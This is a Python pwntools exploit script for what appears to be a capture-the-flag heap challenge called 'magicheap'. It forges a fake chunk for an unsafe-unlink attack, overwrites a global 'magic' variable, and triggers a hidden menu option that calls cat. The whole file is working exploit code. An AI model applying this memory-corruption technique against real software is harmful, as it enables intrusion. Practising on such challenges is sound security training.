import pwn as p

target = p.process('./magicheap')
# p.gdb.attach(target)


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def insert(payload: bytes):
    prints(target.recvuntil(b'Your choice :'))
    target.sendline(b'1')
    prints(target.recvuntil(b'Size of Heap : '))
    target.sendline(b(str(len(payload))))
    prints(target.recvuntil(b'Content of heap:'))
    target.send(payload)


def edit(index: int, payload: bytes):
    prints(target.recvuntil(b'Your choice :'))
    target.sendline(b'2')
    prints(target.recvuntil(b'Index :'))
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'Size of Heap : '))
    target.sendline(b(str(len(payload))))
    prints(target.recvuntil(b'Content of heap : '))
    target.send(payload)


def delete(index: int):
    prints(target.recvuntil(b'Your choice :'))
    target.sendline(b'3')
    prints(target.recvuntil(b'Index :'))
    target.sendline(b(str(index)))


insert(b'a'*0x420)
insert(b'b'*0x420)

chunk_list_ptr = 0x6020e0

fake_chunk = p.p64(0x0) + p.p64(0x421)  # headers of fake chunk
fake_chunk += p.p64(chunk_list_ptr - 0x18) + p.p64(chunk_list_ptr - 0x10)
fake_chunk += b'\x00' * 0x400  # padding
fake_chunk += p.p64(0x420) + p.p64(0x430)

edit(0, fake_chunk)

delete(1)

# at this point the first entry of chunk_list is pointing at 0x6020c8
magic = 0x006020c0
edit(0, p.p64(0x0)*3 + p.p64(magic))

# we are now pointing at magic
edit(0, p.p64(0xdeadbeef))

# send secret option to call cat
target.sendline(b'4869')

target.interactive()
